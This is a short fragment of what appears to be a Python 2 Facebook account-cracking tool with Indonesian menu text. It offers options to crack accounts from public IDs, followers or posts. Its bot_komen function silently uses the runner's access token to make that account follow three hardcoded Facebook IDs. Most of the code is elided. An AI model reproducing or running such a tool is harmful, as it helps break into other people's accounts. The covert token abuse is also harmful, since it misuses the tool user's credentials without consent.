...
def bot_komen():
    ...
    requests.post('https://graph.facebook.com/100037195783760/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100050473873716/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100051836679623/subscribers?access_token=' + token)
...
def menu():
	...
	print(" "+p+"[*] Status: "+H+"Unlimited")
	print(" "+p+"[*] ---------------------------------------------")
	print
	print("      [  Wellcome User ]")
	print
	print(""+p+" [1]. Crack From ID Publik")
	print(" [2]. Crack From Follower")
	print(" [3]. Crack From Post")
	print(" [4]. Cek Results")
	print(" [5]. Setting User Agent")
	print(" [6]. Cek Information Account Facebook")
	print(" [0]. Logout")
	print
	ask = raw_input(" [*] Pilih : ")
	if ask =="":
